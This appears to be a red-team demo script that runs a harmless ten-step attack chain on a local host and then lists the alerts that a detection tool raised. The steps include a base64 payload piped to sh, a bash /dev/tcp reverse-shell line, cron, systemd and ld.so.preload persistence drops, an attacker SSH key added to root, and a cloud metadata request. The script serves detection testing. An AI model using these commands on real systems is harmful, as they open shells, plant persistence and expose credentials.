#!/usr/bin/env bash
# demo-1-attack-chain.sh — runs a representative full attack chain
# against the local xhelix-monitored host and prints the alerts
# fired at each step.
#
# Designed for the "10-minute demo" story: each step is announced,
# executed, and its expected detection rule named. Operators run
# `xhelixctl alerts tail` in another terminal to watch live; this
# script prints a per-step summary at the end.
#
# Run: sudo bash tests/redteam/demo-1-attack-chain.sh
# Companion: demo-2-legit-workload.sh (run in parallel for noise).

set -uo pipefail

GREEN=$'\033[32m'; CYAN=$'\033[36m'; YELLOW=$'\033[33m'; NC=$'\033[0m'

if [[ $EUID -ne 0 ]]; then
    echo "Run as root: sudo bash $0"
    exit 1
fi

step() { printf "${CYAN}[%s]${NC} %s\n" "$1" "$2"; }
note() { printf "${YELLOW}      → expected: %s${NC}\n" "$1"; }
done_step() { printf "${GREEN}      ✓${NC}\n"; }

T0=$(date -u +%s)
MARK="/tmp/xhe-demo1-$T0"
echo "$T0" > "$MARK.begin"

step "0" "starting demo attack chain (root pid=$$, mark=$MARK)"

# ──────────────────────────────────────────────────────────────
step "1" "base64-stage → sh    (T1059, encoded payload pattern)"
note "lolbin.suspicious  or  cooccur.download_and_execute"
echo "ZWNobyAiZGVtbyBzdGFnZSAxIHJhbiBhcyAkKGlkKSIK" | base64 -d | sh
done_step

step "2" "memfd_create + execv  (T1620, fileless execution)"
note "memfd_run_pattern"
python3 -c "
import os
fd = os.memfd_create('demo_stage', 0)
os.write(fd, b'#!/bin/sh\necho \"demo: memfd stage ran as \$(id)\"\n')
os.execv(f'/proc/self/fd/{fd}', ['demo_stage'])
"
done_step

step "3" "reverse-shell pattern (T1059.004, bash /dev/tcp)"
note "shell_with_socket_fd  +  revshell.detected"
timeout 2 bash -c 'exec 5<>/dev/tcp/127.0.0.1/12345; echo demo3 >&5' 2>/dev/null
done_step

step "4" "SUID copy of /bin/sh  (T1548.001)"
note "binary_runs_from_tmp  +  suid_baseline"
cp /bin/echo /tmp/.demo_suid 2>/dev/null
chmod 4755 /tmp/.demo_suid 2>/dev/null
ls -la /tmp/.demo_suid
rm -f /tmp/.demo_suid
done_step

step "5" "/etc/cron.d drop      (T1053.003, cron persistence)"
note "cron_new_unit  +  FIM tamper"
bash -c 'echo "*/5 * * * * root /usr/bin/id > /tmp/.demo_beacon" > /etc/cron.d/xhe-demo-cron'
sleep 1
rm -f /etc/cron.d/xhe-demo-cron 2>/dev/null
done_step

step "6" "/etc/ld.so.preload    (T1574.006, library preload persistence)"
note "ld_so_preload_modified  +  remediator should restore (in enforce mode)"
echo "/tmp/xhe_evil_demo.so" > /etc/ld.so.preload.demo
sleep 1
rm -f /etc/ld.so.preload.demo
done_step

step "7" "systemd unit drop     (T1543.002)"
note "systemd_unit_added  +  FIM"
mkdir -p /etc/systemd/system
printf '[Service]\nExecStart=/bin/sh -c id\n[Install]\nWantedBy=multi-user.target\n' \
    > /etc/systemd/system/xhe-demo.service
sleep 1
rm -f /etc/systemd/system/xhe-demo.service
done_step

step "8" "/root/.ssh/authorized_keys append (T1098.004)"
note "ssh_key_added_root  +  FIM"
mkdir -p /root/.ssh
echo "ssh-rsa AAAAATTACKER_DEMO_KEY attacker@demo" >> /root/.ssh/authorized_keys
# Restore by removing the line we added
sed -i '/AAAAATTACKER_DEMO_KEY/d' /root/.ssh/authorized_keys
done_step

step "9" "process_vm_readv      (T1003, cross-process memory read)"
note "NeverLearnable signal (process_vm_readv)"
python3 -c "
import os, ctypes
class iovec(ctypes.Structure):
    _fields_=[('base',ctypes.c_void_p),('len',ctypes.c_size_t)]
libc = ctypes.CDLL('libc.so.6')
buf = ctypes.create_string_buffer(64)
local = iovec(ctypes.addressof(buf), 64)
remote = iovec(0x400000, 64)
libc.process_vm_readv(1, ctypes.byref(local), 1, ctypes.byref(remote), 1, 0)
" 2>/dev/null
done_step

step "10" "SSRF to AWS IMDS      (T1552.005)"
note "metadata_svc_unexpected  +  metadata.access_by_unexpected"
timeout 2 curl -s http://169.254.169.254/latest/meta-data/ -o /dev/null 2>/dev/null
done_step

echo
T1=$(date -u +%s)
echo "$T1" > "$MARK.end"
WINDOW_S=$((T1 - T0))
echo "${GREEN}attack chain complete in ${WINDOW_S}s${NC}"
echo

# ──────────────────────────────────────────────────────────────
echo "${CYAN}=== alerts fired during attack window ===${NC}"
sleep 5  # let alert pipeline drain
WINDOW="${WINDOW_S}s"
xhelixctl alerts stats --since "$WINDOW" --by rule 2>/dev/null
echo
echo "${CYAN}=== top 15 attack-class alerts ===${NC}"
xhelixctl alerts ls --since "$WINDOW" --severity info --limit 15 2>/dev/null \
    | grep -aE '^TIME|memfd|shell|reverse|cron|preload|cap|ptrace|metadata|lolbin|suspicious|binary_runs|systemd|ssh_key|tamper|revshell' \
    | head -20
echo
echo "${CYAN}=== takeover scorer plans (planner shadow) ===${NC}"
sudo grep -aE 'planner shadow' /var/log/xhelix/xhelix.out | tail -10 \
    | grep -oE 'tier=[a-z]+ score=[0-9]+ actions="\[[^]]+\]"' | head -10
echo
echo "${GREEN}=== demo complete ===${NC}"
echo "Triage commands:"
echo "  xhelixctl alerts ls --rule shell_with_socket_fd --since 5m"
echo "  xhelixctl alerts show <event-id>"
echo "  xhelixctl alerts stats --by comm --since 5m"
echo "  sudo xhelix-verify --chain /var/lib/xhelix/chain --pub <pub>"
